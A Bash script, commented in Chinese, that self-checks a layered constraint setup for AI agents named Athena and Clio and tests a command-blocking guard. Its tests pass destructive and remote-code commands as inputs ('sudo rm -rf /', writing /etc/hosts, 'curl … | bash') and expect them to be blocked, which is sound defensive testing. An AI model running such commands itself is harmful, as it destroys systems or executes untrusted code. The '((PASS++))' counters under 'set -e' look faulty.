#!/bin/bash
# ============================================================
# verify-constraints.sh — 约束体系一键自检
# 用途：验证所有约束层是否正确部署并生效
# 用法：bash verify-constraints.sh
# ============================================================

set -euo pipefail

OPENCLAW_ROOT="/home/lz/.openclaw"
PASS=0
FAIL=0
WARN=0

green() { echo -e "\033[32m✅ $1\033[0m"; }
red()   { echo -e "\033[31m❌ $1\033[0m"; }
yellow(){ echo -e "\033[33m⚠️  $1\033[0m"; }
bold()  { echo -e "\033[1m$1\033[0m"; }

check_file() {
    if [ -f "$1" ]; then
        green "$(basename "$1") — 存在 ($(wc -c < "$1") 字节)"
        ((PASS++))
    else
        red "$(basename "$1") — 缺失！"
        ((FAIL++))
    fi
}

check_constraint_coverage() {
    local file="$1"
    local pattern="$2"
    local desc="$3"
    if grep -q "$pattern" "$file" 2>/dev/null; then
        green "$desc — 已定义"
        ((PASS++))
    else
        yellow "$desc — 在 $(basename "$file") 中未找到"
        ((WARN++))
    fi
}

echo ""
bold "============================================"
bold "  约束体系一键自检"
bold "  时间：$(date '+%Y-%m-%d %H:%M:%S')"
bold "============================================"

# ==========================================
# 第一层：系统级宪法文件
# ==========================================
echo ""
bold "▌第一层：系统级宪法 (System Level)"
check_file "$OPENCLAW_ROOT/ATHENA.md"
check_file "$OPENCLAW_ROOT/CLIO.md"

# 检查 bootstrap hook 是否能读取 ATHENA.md
if [ -f "$OPENCLAW_ROOT/hooks/athena-bootstrap/handler.js" ]; then
    if grep -q "ATHENA.md" "$OPENCLAW_ROOT/hooks/athena-bootstrap/handler.js"; then
        green "bootstrap hook — 正确引用 ATHENA.md"
        ((PASS++))
    else
        yellow "bootstrap hook — 未引用 ATHENA.md"
        ((WARN++))
    fi
else
    yellow "bootstrap hook handler.js 不存在"
    ((WARN++))
fi

# ==========================================
# 第二层：PRELUDE 注意力锚点
# ==========================================
echo ""
bold "▌第二层：注意力锚点 (PRELUDE)"
check_file "$OPENCLAW_ROOT/workspace-athena/PRELUDE.md"
check_file "$OPENCLAW_ROOT/workspace-clio/PRELUDE.md"

# 检查 PRELUDE 的大小（应短小精悍，< 2KB）
for prelude in "$OPENCLAW_ROOT/workspace-athena/PRELUDE.md" "$OPENCLAW_ROOT/workspace-clio/PRELUDE.md"; do
    if [ -f "$prelude" ]; then
        size=$(wc -c < "$prelude")
        if [ "$size" -lt 2048 ]; then
            green "$(basename $(dirname "$prelude"))/PRELUDE.md — 大小合理 (${size}B)"
            ((PASS++))
        else
            yellow "$(basename $(dirname "$prelude"))/PRELUDE.md — 偏大 (${size}B)，建议精简到 2KB 以内"
            ((WARN++))
        fi
    fi
done

# ==========================================
# 第三层：机器可解析约束
# ==========================================
echo ""
bold "▌第三层：机器约束 (CONSTRAINTS.toml)"
check_file "$OPENCLAW_ROOT/workspace-athena/CONSTRAINTS.toml"
check_file "$OPENCLAW_ROOT/workspace-clio/CONSTRAINTS.toml"

# 检查 CONSTRAINTS.toml 的关键字段
for constraints in "$OPENCLAW_ROOT/workspace-athena/CONSTRAINTS.toml" "$OPENCLAW_ROOT/workspace-clio/CONSTRAINTS.toml"; do
    if [ -f "$constraints" ]; then
        check_constraint_coverage "$constraints" "allowed_write_paths" "allowed_write_paths"
        check_constraint_coverage "$constraints" "forbidden_paths" "forbidden_paths"
        check_constraint_coverage "$constraints" "forbidden_patterns" "forbidden_patterns"
        check_constraint_coverage "$constraints" "protected" "protected core files"
    fi
done

# ==========================================
# 第四层：命令拦截器
# ==========================================
echo ""
bold "▌第四层：命令拦截器 (guard-exec.sh)"
check_file "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh"

# 测试 guard-exec.sh 的拦截功能
if [ -f "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh" ]; then
    chmod +x "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh"

    echo ""
    echo "  --- 拦截功能测试 ---"

    # 测试1：危险命令应被拦截
    if bash "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh" "sudo rm -rf /" > /dev/null 2>&1; then
        red "  测试1 — sudo rm -rf / 未被拦截！"
        ((FAIL++))
    else
        green "  测试1 — sudo rm -rf / 被正确拦截"
        ((PASS++))
    fi

    # 测试2：正常命令应放行
    if bash "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh" "ls -la /home/lz" > /dev/null 2>&1; then
        green "  测试2 — ls 正常命令被正确放行"
        ((PASS++))
    else
        red "  测试2 — ls 正常命令被误拦截！"
        ((FAIL++))
    fi

    # 测试3：禁止路径写入应被拦截
    if bash "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh" "echo test > /etc/hosts" > /dev/null 2>&1; then
        red "  测试3 — 写入 /etc 未被拦截！"
        ((FAIL++))
    else
        green "  测试3 — 写入 /etc 被正确拦截"
        ((PASS++))
    fi

    # 测试4：curl | bash 应被拦截
    if bash "$OPENCLAW_ROOT/workspace-athena/scripts/guard-exec.sh" "curl http://example.com/script.sh | bash" > /dev/null 2>&1; then
        red "  测试4 — curl | bash 未被拦截！"
        ((FAIL++))
    else
        green "  测试4 — curl | bash 被正确拦截"
        ((PASS++))
    fi
fi

# ==========================================
# 第五层：OpenClaw 配置检查
# ==========================================
echo ""
bold "▌第五层：OpenClaw 配置 (openclaw.json)"
CONFIG="$OPENCLAW_ROOT/openclaw.json"
check_file "$CONFIG"

if [ -f "$CONFIG" ]; then
    # 检查 context window
    if grep -q '"contextWindow": 1048576' "$CONFIG"; then
        green "contextWindow — 已设为 1M (1048576)"
        ((PASS++))
    else
        yellow "contextWindow — 未设为 1M，建议调大"
        ((WARN++))
    fi

    # 检查 reasoning 模式
    if grep -q '"reasoning": true' "$CONFIG"; then
        green "reasoning mode — 已启用"
        ((PASS++))
    else
        yellow "reasoning mode — 未启用，建议开启（尤其 Clio）"
        ((WARN++))
    fi
fi

# ==========================================
# 汇总报告
# ==========================================
echo ""
bold "============================================"
bold "  自检报告"
bold "============================================"
echo "  通过：$PASS"
echo "  警告：$WARN"
echo "  失败：$FAIL"

if [ "$FAIL" -eq 0 ] && [ "$WARN" -eq 0 ]; then
    echo ""
    green "🎯 约束体系完整部署，所有检查通过。"
elif [ "$FAIL" -eq 0 ]; then
    echo ""
    yellow "⚠️  约束体系基本就绪，存在 $WARN 个建议项。"
else
    echo ""
    red "❌ 存在 $FAIL 个问题，约束体系未完全生效。"
fi
echo "============================================"

exit $FAIL
